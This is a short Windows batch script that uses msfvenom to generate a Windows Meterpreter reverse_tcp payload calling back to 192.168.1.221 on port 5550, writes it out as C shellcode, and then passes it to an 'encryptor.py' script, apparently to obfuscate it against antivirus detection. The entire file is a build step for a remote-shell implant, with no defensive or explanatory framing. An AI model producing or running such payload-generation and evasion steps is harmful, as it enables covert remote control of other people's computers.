@echo off
chcp 65001 > nul
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.221 LPORT=5550 -f c -o shellcode.c
pause
python encryptor.py shellcode.c
pause
